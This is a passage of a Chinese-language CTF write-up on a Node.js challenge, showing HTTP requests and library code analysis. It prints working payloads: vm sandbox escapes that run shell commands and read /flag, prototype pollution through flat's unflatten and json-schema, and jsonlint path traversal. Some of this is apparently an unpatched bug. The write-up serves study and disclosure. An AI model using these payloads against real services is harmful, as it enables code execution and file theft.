class="hljs-attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line"><span class="hljs-attribute">Accept-Language</span>: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="hljs-attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="hljs-attribute">Connection</span>: close</span><br><span class="line"><span class="hljs-attribute">Upgrade-Insecure-Requests</span>: 1</span><br><span class="line"><span class="hljs-attribute">Content-Type</span>: application/json</span><br><span class="line"><span class="hljs-attribute">Content-Length</span>: 160</span><br><span class="line"></span><br><span class="line">[&quot;const process = this.constructor.constructor(&apos;return this.process&apos;)(); process.mainModule.require(&apos;child_process&apos;).execSync(&apos;cat /f&apos;+&apos;l&apos;+&apos;a&apos;+&apos;g&apos;).toString()&quot;]</span><br></pre></td></tr></tbody></table></figure><p></p><p></p><figure class="highlight hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 <span class="hljs-number">200</span> OK</span><br><span class="line"><span class="hljs-attribute">Content-Type</span>: application/json; charset=utf-8</span><br><span class="line"><span class="hljs-attribute">Content-Length</span>: 85</span><br><span class="line"><span class="hljs-attribute">ETag</span>: W/&quot;55-/Dqsanp9FGAj8iXHTLNo/PbZBTc&quot;</span><br><span class="line"><span class="hljs-attribute">Date</span>: Tue, 13 Oct 2020 10:52:05 GMT</span><br><span class="line"><span class="hljs-attribute">Connection</span>: close</span><br><span class="line"></span><br><span class="line">{&quot;validator&quot;:&quot;000AAAA\n&quot;,&quot;data&quot;:{&quot;treasure&quot;:&quot;data-piece2&quot;},&quot;msg&quot;:&quot;data is corrupted&quot;}</span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x540E;&#x9762;&#x7684;&#x5C31;&#x662F;&#x57FA;&#x672C;&#x662F;&#x57FA;&#x4E8E; post body &#x7684;&#x53D8;&#x5F62;&#x4E86;&#xFF1A;</p><ul><li><code>[&quot;const process = this.constructor.constructor(&apos;return this.process&apos;)(); process.mainModule.require(&apos;child_process&apos;).execSync(&apos;cat /f&apos;+&apos;l&apos;+&apos;a&apos;+&apos;g&apos;).toString()&quot;]</code></li><li><code>[&quot;const p = this.constructor.constructor(&apos;return this.process&apos;)(); p.mainModule.require(&apos;fs&apos;).readFileSync(&apos;/f&apos;+&apos;l&apos;+&apos;a&apos;+&apos;g&apos;).toString()&quot;]</code></li><li><code>[&quot;p = this.constructor.constructor(\&quot;return process\&quot;)(); r = p.mainModule.require; fs = r(\&quot;fs\&quot;); throw new Error(fs.readFileSync(\&quot;/flag\&quot;).toString())&quot;]</code></li><li><code>[&quot;var process = this.constructor.constructor(&apos;return this.process&apos;)(); process.mainModule.require(&apos;child_process&apos;).execSync(&apos;cat /f&apos;+&apos;l&apos;+&apos;a&apos;+&apos;g&apos;).toString()&quot;]</code></li><li><code>[&quot;p = this.constructor.constructor(\&quot;return process\&quot;)(); r = p.mainModule.require; fs = r(\&quot;fs\&quot;); fs.readFileSync(\&quot;/flag\&quot;).toString()&quot;]</code></li><li><code>[&quot;const process = this.constructor.constructor(&apos;return this.process&apos;)(); process.mainModule.require(&apos;child_process&apos;).execSync(&apos;cat /f&apos;+&apos;l&apos;+&apos;a&apos;+&apos;g&apos;).toString()&quot;]</code></li><li><code>[&quot;const process = this.constructor.constructor(&apos;return this.process&apos;)(); process.mainModule.require(&apos;child_process&apos;).execSync(&apos;cat /f&apos;+&apos;l&apos;+&apos;a&apos;+&apos;g&apos;).toString()&quot;]</code></li><li><code>[&quot;var process = this.constructor.constructor(\&quot;return process\&quot;)(); p.mainModule.require(&apos;child_process&apos;).execSync(&apos;cat /f&apos;+&apos;l&apos;+&apos;a&apos;+&apos;g&apos;).toString()&quot;]</code></li><li><code>[&quot;this.constructor.constructor(&apos;return process&apos;)().mainModule.require(&apos;fs&apos;).readFileSync(&apos;/f&apos;+&apos;l&apos;+&apos;a&apos;+&apos;g&apos;)+[]&quot;]</code></li><li><code>[&quot;this.constructor.constructor(&apos;return process&apos;)().mainModule.require(&apos;child_process&apos;).execSync(&apos;cat /f*&apos;)+[]&quot;]</code></li><li><code>[&quot;const process = this.constructor.constructor(&apos;return this.process&apos;)(); process.mainModule.require(&apos;child_process&apos;).execSync(&apos;cat /*g&apos;).toString()&quot;]</code></li></ul><h3 id="flat"><a href="#flat" class="headerlink" title="flat"></a>flat</h3><p></p><figure class="highlight hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">POST</span> <span class="hljs-string">/config/validated/flat/unflatten</span> HTTP/1.1</span><br><span class="line"><span class="hljs-attribute">Host</span>: zedd.vv:4017</span><br><span class="line"><span class="hljs-attribute">User-Agent</span>: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:81.0) Gecko/20100101 Firefox/81.0</span><br><span class="line"><span class="hljs-attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line"><span class="hljs-attribute">Accept-Language</span>: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="hljs-attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="hljs-attribute">Connection</span>: close</span><br><span class="line"><span class="hljs-attribute">Upgrade-Insecure-Requests</span>: 1</span><br><span class="line"><span class="hljs-attribute">Content-Type</span>: application/json</span><br><span class="line"><span class="hljs-attribute">Content-Length</span>: 29</span><br><span class="line"></span><br><span class="line">{&quot;__proto__.path&quot;: &quot;/flag&quot;}</span><br></pre></td></tr></tbody></table></figure><p></p><p></p><figure class="highlight hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 <span class="hljs-number">200</span> OK</span><br><span class="line"><span class="hljs-attribute">Content-Type</span>: application/json; charset=utf-8</span><br><span class="line"><span class="hljs-attribute">Content-Length</span>: 35</span><br><span class="line"><span class="hljs-attribute">ETag</span>: W/&quot;23-RVcPh+LK1Ac7n2mAq1KjFd049Xo&quot;</span><br><span class="line"><span class="hljs-attribute">Date</span>: Tue, 13 Oct 2020 16:54:07 GMT</span><br><span class="line"><span class="hljs-attribute">Connection</span>: close</span><br><span class="line"></span><br><span class="line">{&quot;validator&quot;:{},&quot;data&quot;:&quot;000AAAA\n&quot;}</span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x8FD9;&#x4E2A;&#x5176;&#x5B9E;&#x662F; 7/18 @po6ix &#x63D0;&#x51FA;&#x4E86; flat lib &#x4E2D;&#x7684; <code>unflatten</code>  &#x5B58;&#x5728;&#x539F;&#x578B;&#x94FE;&#x6C61;&#x67D3;&#xFF1A;<a href="https://github.com/hughsk/flat/issues/105" target="_blank" rel="noopener">https://github.com/hughsk/flat/issues/105</a></p><p>&#x7B80;&#x5355; debug &#x8DDF;&#x4E86;&#x4E00;&#x4E0B;&#xFF0C;&#x7B80;&#x5316;&#x4E86;&#x4E00;&#x4E0B;&#x539F;&#x51FD;&#x6570;&#x4EE3;&#x7801;&#xFF1A;</p><p></p><figure class="highlight javascript hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">unflatten</span> (<span class="hljs-params">target, opts</span>) </span>{</span><br><span class="line">  opts = opts || {}</span><br><span class="line"></span><br><span class="line">  <span class="hljs-keyword">const</span> delimiter = opts.delimiter || <span class="hljs-string">&apos;.&apos;</span></span><br><span class="line">  <span class="hljs-keyword">const</span> overwrite = opts.overwrite || <span class="hljs-literal">false</span></span><br><span class="line">  <span class="hljs-keyword">const</span> transformKey = opts.transformKey || keyIdentity</span><br><span class="line">  <span class="hljs-keyword">const</span> result = {}</span><br><span class="line"></span><br><span class="line">  <span class="hljs-comment">//...</span></span><br><span class="line"></span><br><span class="line">  <span class="hljs-built_in">Object</span>.keys(target).forEach(<span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">key</span>) </span>{</span><br><span class="line">    <span class="hljs-keyword">const</span> split = key.split(delimiter).map(transformKey)</span><br><span class="line">    <span class="hljs-keyword">let</span> key1 = getkey(split.shift())</span><br><span class="line">    <span class="hljs-keyword">let</span> key2 = getkey(split[<span class="hljs-number">0</span>])</span><br><span class="line">    <span class="hljs-keyword">let</span> recipient = result</span><br><span class="line"></span><br><span class="line">    <span class="hljs-keyword">while</span> (key2 !== <span class="hljs-literal">undefined</span>) {</span><br><span class="line">      <span class="hljs-keyword">const</span> type = <span class="hljs-built_in">Object</span>.prototype.toString.call(recipient[key1])</span><br><span class="line">      <span class="hljs-keyword">const</span> isobject = (</span><br><span class="line">        type === <span class="hljs-string">&apos;[object Object]&apos;</span> ||</span><br><span class="line">        type === <span class="hljs-string">&apos;[object Array]&apos;</span></span><br><span class="line">      )</span><br><span class="line"></span><br><span class="line">      <span class="hljs-comment">// do not write over falsey, non-undefined values if overwrite is false</span></span><br><span class="line">      <span class="hljs-keyword">if</span> (!overwrite &amp;&amp; !isobject &amp;&amp; <span class="hljs-keyword">typeof</span> recipient[key1] !== <span class="hljs-string">&apos;undefined&apos;</span>) {</span><br><span class="line">        <span class="hljs-keyword">return</span></span><br><span class="line">      }</span><br><span class="line"></span><br><span class="line">      <span class="hljs-keyword">if</span> ((overwrite &amp;&amp; !isobject) || (!overwrite &amp;&amp; recipient[key1] == <span class="hljs-literal">null</span>)) {</span><br><span class="line">        recipient[key1] = (</span><br><span class="line">          <span class="hljs-keyword">typeof</span> key2 === <span class="hljs-string">&apos;number&apos;</span> &amp;&amp;</span><br><span class="line">          !opts.object ? [] : {}</span><br><span class="line">        )</span><br><span class="line">      }</span><br><span class="line"></span><br><span class="line">      recipient = recipient[key1]</span><br><span class="line">      <span class="hljs-keyword">if</span> (split.length &gt; <span class="hljs-number">0</span>) {</span><br><span class="line">        key1 = getkey(split.shift())</span><br><span class="line">        key2 = getkey(split[<span class="hljs-number">0</span>])</span><br><span class="line">      }</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="hljs-comment">// unflatten again for &apos;messy objects&apos;</span></span><br><span class="line">    recipient[key1] = unflatten(target[key], opts)</span><br><span class="line">  })</span><br><span class="line"></span><br><span class="line">  <span class="hljs-keyword">return</span> result</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x6211;&#x4EEC;&#x4F20;&#x5165;<code>{&quot;__proto__.path&quot;: &quot;/flag&quot;}</code> &#x5230; <code>target</code> &#x53D8;&#x91CF;&#xFF0C;&#x7136;&#x540E;&#x7ECF;&#x8FC7;&#x4E00;&#x4E9B;&#x5224;&#x65AD;&#x4EE5;&#x53CA;&#x64CD;&#x4F5C;&#xFF0C;&#x7ECF;&#x8FC7; <code>while</code> &#x7B2C;&#x4E00;&#x8F6E;&#x5FAA;&#x73AF;&#x5F97;&#x5230;:</p><p></p><figure class="highlight javascript hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">recipient = recipient[key1]<span class="hljs-comment">//recipient = {}[&quot;__proto__&quot;]</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x6B64;&#x65F6; <code>recipient</code> &#x5C31;&#x6307;&#x5411;&#x4E86; <code>Function.prototype</code> &#xFF0C;&#x800C;&#x5FAA;&#x73AF;&#x7ED3;&#x675F;&#x4E4B;&#x540E;&#x9012;&#x5F52;&#x6267;&#x884C; <code>unflatten</code> &#x51FD;&#x6570;&#xFF0C;&#x6B64;&#x65F6;</p><p></p><figure class="highlight javascript hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">recipient[key1] = unflatten(target[key], opts) <span class="hljs-comment">// recipient[&apos;path&apos;] = unflatten(&quot;/flag&quot;, {})</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x800C;&#x56E0;&#x4E3A;&#x4F20;&#x5165;&#x7684;&#x7B2C;&#x4E00;&#x4E2A;&#x53C2;&#x6570;&#x4E5F;&#x5C31;&#x662F; <code>/flag</code>  &#x4E3A;&#x5B57;&#x7B26;&#x4E32;&#xFF0C;&#x88AB; <code>unflatten</code> &#x76F4;&#x63A5;&#x8FD4;&#x56DE;&#xFF0C;&#x4E5F;&#x5C31;&#x662F;&#x8BF4;&#x6700;&#x7EC8;&#x7ED3;&#x679C;&#x4E3A;&#xFF1A;</p><p></p><figure class="highlight javascript hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">recipient[key1] = <span class="hljs-string">&apos;/flag&apos;</span><span class="hljs-comment">//recipient[&apos;path&apos;] = &apos;/flag&apos;</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x6574;&#x4E2A;&#x6D41;&#x7A0B;&#x53EF;&#x4EE5;&#x7B80;&#x5316;&#x4E3A;&#xFF1A;</p><p></p><figure class="highlight javascript hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">var</span> obj = {};</span><br><span class="line"><span class="hljs-keyword">var</span> a = {};</span><br><span class="line">obj = obj[<span class="hljs-string">&quot;__proto__&quot;</span>];</span><br><span class="line">obj[<span class="hljs-string">&apos;path&apos;</span>] = <span class="hljs-string">&apos;/flag&apos;</span>;</span><br><span class="line"><span class="hljs-built_in">console</span>.log(obj.path);</span><br><span class="line"><span class="hljs-built_in">console</span>.log(a.path);</span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x8FD9;&#x6837;&#x5C31;&#x5B8C;&#x6210;&#x4E86;&#x539F;&#x578B;&#x94FE;&#x6C61;&#x67D3;&#x7684;&#x6548;&#x679C;&#xFF0C;&#x6211;&#x4EEC;&#x5C31;&#x53EF;&#x4EE5;&#x5C06; <code>config.path</code> &#x6C61;&#x67D3;&#x6210; flag &#x8DEF;&#x5F84;&#x4E86;&#xFF0C;&#x4E5F;&#x5C31;&#x53EF;&#x4EE5;&#x8BFB;&#x5230; flag &#x4E86;</p><p>&#x5B58;&#x5728;&#x4E00;&#x4E9B;&#x53D8;&#x5F62;&#x6BD4;&#x5982;&#xFF1A;</p><ul><li>&#x66F4;&#x6539;&#x4F20;&#x8F93;&#x65B9;&#x5F0F;&#x4E3A;<code>application/x-www-form-urlencoded</code></li><li>&#x66F4;&#x6539;&#x5F15;&#x7528;&#x8DEF;&#x5F84;<code>POST /config/validated/..%2fnode_modules%2fflat/unflatten HTTP/1.1</code></li></ul><p>&#x987A;&#x4FBF;&#xFF0C;flat &#x5DF2;&#x7ECF;&#x4FEE;&#x590D;&#x4E86;&#x8FD9;&#x4E2A;&#x539F;&#x578B;&#x94FE;&#x6C61;&#x67D3;&#xFF0C;&#x4FEE;&#x590D;&#x65B9;&#x5F0F;&#x662F;&#x5C06;<code>__proto__</code>&#x8BBE;&#x7F6E;&#x4E3A; <code>key1</code> &#x7684;&#x9ED1;&#x540D;&#x5355;&#xFF1A;<a href="https://github.com/hughsk/flat/pull/106/commits/b7815abada29592b0067e391ab215a462a7347e8" target="_blank" rel="noopener">https://github.com/hughsk/flat/pull/106/commits/b7815abada29592b0067e391ab215a462a7347e8</a></p><h3 id="Jsonlint"><a href="#Jsonlint" class="headerlink" title="Jsonlint"></a>Jsonlint</h3><p></p><figure class="highlight hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">POST</span> <span class="hljs-string">/config/validated/jsonlint/main</span> HTTP/1.1</span><br><span class="line"><span class="hljs-attribute">Host</span>: zedd.vv:4017</span><br><span class="line"><span class="hljs-attribute">User-Agent</span>: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:81.0) Gecko/20100101 Firefox/81.0</span><br><span class="line"><span class="hljs-attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line"><span class="hljs-attribute">Accept-Language</span>: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="hljs-attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="hljs-attribute">Connection</span>: close</span><br><span class="line"><span class="hljs-attribute">Upgrade-Insecure-Requests</span>: 1</span><br><span class="line"><span class="hljs-attribute">Content-Type</span>: application/json</span><br><span class="line"><span class="hljs-attribute">Content-Length</span>: 33</span><br><span class="line"></span><br><span class="line">{&quot;1&quot;:&quot;../../../../../../../flag&quot;}</span><br></pre></td></tr></tbody></table></figure><p></p><p></p><figure class="highlight hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 <span class="hljs-number">500</span> Internal Server Error</span><br><span class="line"><span class="hljs-attribute">Content-Type</span>: text/html; charset=utf-8</span><br><span class="line"><span class="hljs-attribute">Content-Length</span>: 1162</span><br><span class="line"><span class="hljs-attribute">ETag</span>: W/&quot;48a-J1p7tUkAXQsyvitsec7yxDGU9yc&quot;</span><br><span class="line"><span class="hljs-attribute">Date</span>: Tue, 13 Oct 2020 16:58:55 GMT</span><br><span class="line"><span class="hljs-attribute">Connection</span>: close</span><br><span class="line"></span><br><span class="line">&lt;h1&gt;Parse error on line 1:</span><br><span class="line"><span class="hljs-attribute">000AAAA</span></span><br><span class="line"><span class="hljs-attribute">^</span></span><br><span class="line">Expecting &amp;#39;STRING&amp;#39;, &amp;#39;NUMBER&amp;#39;, &amp;#39;NULL&amp;#39;, &amp;#39;TRUE&amp;#39;, &amp;#39;FALSE&amp;#39;, &amp;#39;{&amp;#39;, &amp;#39;[&amp;#39;, got &amp;#39;undefined&amp;#39;&lt;/h1&gt;</span><br><span class="line">&lt;h2&gt;&lt;/h2&gt;</span><br><span class="line">&lt;pre&gt;Error: Parse error on line 1:</span><br><span class="line"><span class="hljs-attribute">000AAAA</span></span><br><span class="line"><span class="hljs-attribute">^</span></span><br><span class="line">Expecting &amp;#39;STRING&amp;#39;, &amp;#39;NUMBER&amp;#39;, &amp;#39;NULL&amp;#39;, &amp;#39;TRUE&amp;#39;, &amp;#39;FALSE&amp;#39;, &amp;#39;{&amp;#39;, &amp;#39;[&amp;#39;, got &amp;#39;undefined&amp;#39;</span><br><span class="line">    at Object.parseError (/service/node_modules/jsonlint/lib/jsonlint.js:55:11)</span><br><span class="line">    at Object.parse (/service/node_modules/jsonlint/lib/jsonlint.js:132:22)</span><br><span class="line">    at Object.commonjsMain [as main] (/service/node_modules/jsonlint/lib/jsonlint.js:427:27)</span><br><span class="line">    at /service/routes/config.js:22:36</span><br><span class="line">    at Layer.handle [as handle_request] (/service/node_modules/express/lib/router/layer.js:95:5)</span><br><span class="line">    at next (/service/node_modules/express/lib/router/route.js:137:13)</span><br><span class="line">    at Route.dispatch (/service/node_modules/express/lib/router/route.js:112:3)</span><br><span class="line">    at Layer.handle [as handle_request] (/service/node_modules/express/lib/router/layer.js:95:5)</span><br><span class="line">    at /service/node_modules/express/lib/router/index.js:281:22</span><br><span class="line">    at param (/service/node_modules/express/lib/router/index.js:354:14)&lt;/pre&gt;</span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x8FD9;&#x4E2A;&#x4E5F;&#x6BD4;&#x8F83;&#x7B80;&#x5355;&#xFF0C;jsonlint lib &#x4E2D;&#x6709;&#x4E00;&#x4E2A; main &#x51FD;&#x6570;&#x5B58;&#x5728;&#x76F4;&#x63A5;&#x5F15;&#x7528;&#x6587;&#x4EF6;&#x7684;&#x64CD;&#x4F5C;&#xFF1A;</p><p></p><figure class="highlight javascript hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">exports.main = <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">commonjsMain</span>(<span class="hljs-params">args</span>) </span>{</span><br><span class="line">    <span class="hljs-keyword">if</span> (!args[<span class="hljs-number">1</span>])</span><br><span class="line">        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">Error</span>(<span class="hljs-string">&apos;Usage: &apos;</span>+args[<span class="hljs-number">0</span>]+<span class="hljs-string">&apos; FILE&apos;</span>);</span><br><span class="line">    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> process !== <span class="hljs-string">&apos;undefined&apos;</span>) {</span><br><span class="line">        <span class="hljs-keyword">var</span> source = <span class="hljs-built_in">require</span>(<span class="hljs-string">&apos;fs&apos;</span>).readFileSync(<span class="hljs-built_in">require</span>(<span class="hljs-string">&apos;path&apos;</span>).join(process.cwd(), args[<span class="hljs-number">1</span>]), <span class="hljs-string">&quot;utf8&quot;</span>);</span><br><span class="line">    } <span class="hljs-keyword">else</span> {</span><br><span class="line">        <span class="hljs-keyword">var</span> cwd = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;file&quot;</span>).path(<span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;file&quot;</span>).cwd());</span><br><span class="line">        <span class="hljs-keyword">var</span> source = cwd.join(args[<span class="hljs-number">1</span>]).read({<span class="hljs-attr">charset</span>: <span class="hljs-string">&quot;utf-8&quot;</span>});</span><br><span class="line">    }</span><br><span class="line">    <span class="hljs-keyword">return</span> exports.parser.parse(source);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x800C; <code>args</code> &#x5219;&#x662F;&#x6211;&#x4EEC;&#x4F20;&#x5165;&#x7684;<code>req.body</code>&#xFF0C;&#x4E5F;&#x5C31;&#x662F;<code>{&quot;1&quot;:&quot;../../../../../../../flag&quot;}</code>&#xFF0C;&#x76F4;&#x63A5;&#x5F15;&#x5165; flag &#x6587;&#x4EF6;&#x5BFC;&#x81F4;&#x62A5;&#x9519;&#x56DE;&#x663E;&#x5373;&#x53EF;&#x3002;</p><h3 id="json-schema"><a href="#json-schema" class="headerlink" title="json-schema"></a>json-schema</h3><p>&#x8FD9;&#x4E2A;&#x5E93;&#x7B97;&#x662F;&#x5B98;&#x65B9;&#x7ED9;&#x7684;&#x4E00;&#x4E2A; hint &#x5427;&#xFF0C;&#x56E0;&#x4E3A;&#x7B97;&#x662F;&#x5728;<code>/config/validated</code>&#x8DEF;&#x7531;&#x9ED8;&#x8BA4;&#x4F7F;&#x7528;&#x7684; lib &#xFF0C;&#x800C;&#x4E14;&#x641C;&#x4E86;&#x4E00;&#x4E0B;&#x662F;&#x4E00;&#x4E2A;&#x5E9F;&#x5F03;&#x7684;&#x4ED3;&#x5E93;&#xFF1A;<a href="https://github.com/kriszyp/json-schema/" target="_blank" rel="noopener">https://github.com/kriszyp/json-schema/</a> &#xFF0C;&#x800C;&#x4E14;&#x770B;&#x8D77;&#x6765;&#x8FD8;&#x80FD;&#x7B97;&#x662F;&#x4E00;&#x4E2A; 0day</p><p></p><figure class="highlight json hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">{<span class="hljs-attr">&quot;$schema&quot;</span>: {<span class="hljs-attr">&quot;properties&quot;</span>: {<span class="hljs-attr">&quot;__proto__&quot;</span>: {<span class="hljs-attr">&quot;properties&quot;</span>: {<span class="hljs-attr">&quot;path&quot;</span>: {<span class="hljs-attr">&quot;default&quot;</span>: <span class="hljs-string">&quot;/flag&quot;</span>}}}}}}</span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x7ECF;&#x8FC7;&#x7B80;&#x5355;&#x8C03;&#x8BD5;&#x53EF;&#x4EE5;&#x53D1;&#x73B0;&#x4E3B;&#x8981;&#x95EE;&#x9898;&#x5728;&#x4E24;&#x4E2A;&#x51FD;&#x6570;&#xFF1A;<code>checkObj</code> &#x4E0E; <code>checkProp</code> </p><p></p><figure class="highlight javascript hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-comment">// validate a value against a property definition</span></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">checkProp</span>(<span class="hljs-params">value, schema, path, i</span>) </span>{</span><br><span class="line"></span><br><span class="line">  <span 